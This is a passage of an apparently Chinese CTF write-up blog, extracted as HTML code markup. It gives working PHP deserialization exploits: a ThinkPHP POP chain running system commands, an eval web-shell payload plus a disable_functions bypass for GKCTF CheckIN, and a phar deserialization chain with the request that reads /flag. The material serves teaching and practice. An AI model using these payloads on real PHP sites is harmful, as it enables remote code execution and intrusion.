class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title class_\">private</span> $<span class=\"title class_\">lazySave</span> = <span class=\"title class_\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$table</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$json</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$jsonAssoc</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$obj</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;lazySave = True;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;cat /nssctfflag&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;exists = True;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;table = <span class=\"variable\">$obj</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;withAttr = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;system&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;json = [<span class=\"string\">&#x27;whoami&#x27;</span>,[<span class=\"string\">&#x27;whoami&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;jsonAssoc = True;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">echo</span>(<span class=\"title class_\">urlencode</span>(<span class=\"title class_\">serialize</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>()))));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"43gkctf-2020checkin\"><a class=\"markdownIt-Anchor\" href=\"#43gkctf-2020checkin\">#</a> 43.[GKCTF 2020]CheckIN</h2>\n<p><mark>本题考点 disable_function 的绕过</mark><br>\n代码审计，传个 Ginkgo, 内容为 base64 编码后的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(&#x27;whoami&#x27;);</span><br><span class=\"line\">system(&#x27;ls /&#x27;);</span><br><span class=\"line\">这些都不行,system函数应该被禁用了</span><br><span class=\"line\"></span><br><span class=\"line\">尝试phpinfo();</span><br><span class=\"line\">?Ginkgo=cGhwaW5mbygpOw==</span><br><span class=\"line\">ctrl+f搜索disable_functions查看被禁用的函数,系统执行函数都被禁用了</span><br><span class=\"line\"></span><br><span class=\"line\">换思路连蚁剑:eval($_POST[1]);</span><br><span class=\"line\">?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class=\"line\"></span><br><span class=\"line\">根目录下可以看到/flag但是权限是700无法读取,而readflag是个可执行文件，但是因为一些函数被禁，所以无法执行这个文件,我们可以尝试绕过disable_function</span><br><span class=\"line\"></span><br><span class=\"line\">php7（php7.0-7.3）中的因为垃圾回收机制(GC)造成的UAF漏洞</span><br></pre></td></tr></table></figure>\n<p>GitHub 上有脚本，来进行命令执行<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21tMHIxL2V4cGxvaXRzL3RyZWUvbWFzdGVyL3BocDctZ2MtYnlwYXNz\"> php7-gc-bypass</span><br>\n 把文件写入 /tmp 文件夹，因为只有它有写的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&#x27;/tmp/1.php&#x27;);</span><br><span class=\"line\">?Ginkgo=aW5jbHVkZSgnL3RtcC8xLnBocCcpOw==</span><br></pre></td></tr></table></figure>\n<h2 id=\"44swpuctf-2021-新生赛babyunser\"><a class=\"markdownIt-Anchor\" href=\"#44swpuctf-2021-新生赛babyunser\">#</a> 44.[SWPUCTF 2021 新生赛] babyunser</h2>\n<p><mark>考点:phar 反序列化</mark><br>\n关于 phar 反序列化的基础可以看这篇博客<a href=\"\"> phar 反序列化</a></p>\n<p>因为会把上传的文件加上 txt 后缀，一开始想利用 phar 文件包含漏洞读取压缩包里面的马，尝试把木马文件压缩成压缩包，zoe.zip, 里面有 zoe.php, 上传进去后，蚁剑连不上去的，/upload/1500ea32e30d649b42e7d5ed6944fcbe.txt (压缩包) 可以访问，而 /upload/1500ea32e30d649b42e7d5ed6944fcbe.txt/zoe.php 返回 404, 而在 read.php 里面读取 phar://upload/1500ea32e30d649b42e7d5ed6944fcbe.txt/zoe.php 却可以，因此此题不是考文件包含，换个思路:phar 反序列化</p>\n<p>首先可以根据查看文件读取 read.php，upload.php,<br>\nclass.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;aa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content=<span class=\"string\">&quot;\\&lt;?php @eval(\\$_POST[1]);?&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$key</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$key</span>-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;func&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>=<span class=\"string\">&#x27;surprise&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename=<span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^\\/|php:|data|zip|\\.\\.\\//i&#x27;</span>,<span class=\"variable\">$this</span>-&gt;filename))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这不合理&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span>=<span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">        <span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"variable\">$var</span>;</span><br><span class=\"line\">        <span class=\"comment\">//此功能废弃，不想写了</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFile</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">filter</span>();</span><br><span class=\"line\">        <span class=\"variable\">$contents</span>=<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;filename);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$contents</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$contents</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;404 not found&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;method&#x27;</span>]&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;var&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;eval&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;arg=<span class=\"string\">&#x27;phpinfo();&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$arg</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>upload.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$upload_path</span>=<span class=\"string\">&quot;upload/&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">time</span>()).<span class=\"string\">&quot;.txt&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_path</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;文件路径：&quot;</span>.<span class=\"variable\">$upload_path</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传失败&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>read.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$filename</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$filename</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$file</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">zz</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"variable\">$contents</span>=<span class=\"variable\">$file</span>-&gt;<span class=\"title function_ invoke__\">getFile</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\">&lt;textarea <span class=\"class\"><span class=\"keyword\">class</span>=&quot;<span class=\"title\">file_content</span>&quot; <span class=\"title\">type</span>=&quot;<span class=\"title\">text</span>&quot; <span class=\"title\">value</span>=&lt;?<span class=\"title\">php</span> <span class=\"title\">echo</span> &quot;&lt;<span class=\"title\">br</span>&gt;&quot;.$<span class=\"title\">contents</span>;?&gt;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br></pre></td></tr></table></figure>\n<p>payload:<br>\n 链子:aa-&gt;zz:toString-&gt;zz:write-&gt;ff:get-&gt;xx:call</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">zz</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">xx</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ff</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">aa</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;8.phar&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">; <span class=\"comment\">//后缀名必须为phar</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>(); <span class=\"comment\">//开始缓冲 Phar 写操作</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class=\"comment\">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>); <span class=\"comment\">//自定义的meta-data存入manifest</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;flag&quot;</span>); <span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>(); <span class=\"comment\">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></figure>\n<p>post:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=phar://upload/928215588a1ae876d70bbd84f0446e4c.txt&amp;method=write&amp;var=content&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"45swpuctf-2022-新生赛js_sign\"><a class=\"markdownIt-Anchor\" 